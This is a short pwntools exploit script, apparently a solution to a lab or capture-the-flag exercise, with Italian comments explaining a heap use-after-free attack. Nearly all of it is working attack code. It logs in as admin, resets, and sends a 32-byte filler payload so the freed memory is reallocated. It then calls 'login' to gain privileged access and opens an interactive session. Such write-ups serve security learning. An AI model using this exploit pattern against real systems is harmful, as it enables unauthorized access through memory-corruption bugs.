from pwn import *

#Questo exploit si base su una vulnerabilitò nell'heap della vittima. In particolare si tratta di 
# un attacco di Use-After-Free. Analizzando il codice (direttamente o tramite tool di disassembling, vedi Ghidra)
# e' possibile trovare la dimensione del payload necessaria per far sì che dopo una "free" venga 
# riassegnato lo stesso spazio di memoria ad un dato successivamente. In questo modo, il puntatore che
# puntava a quello spazio di memoria potra' accedervi anche dopo la chiamata "free". 

def main():
    e = ELF('../Machines/UAF')
    context.binary = e
    p = process(e.path)

    p.recvuntil(b'> ')
    p.sendline(b'auth admin')
    p.recvuntil(b'> ')
    p.sendline(b'reset')
    p.recvuntil(b'> ')

    payload = b'A'*32

    p.sendline(b'service ' + payload)
    p.recvuntil(b'> ')
    p.sendline(b'login')
    p.interactive()


if __name__ == '__main__':
    main()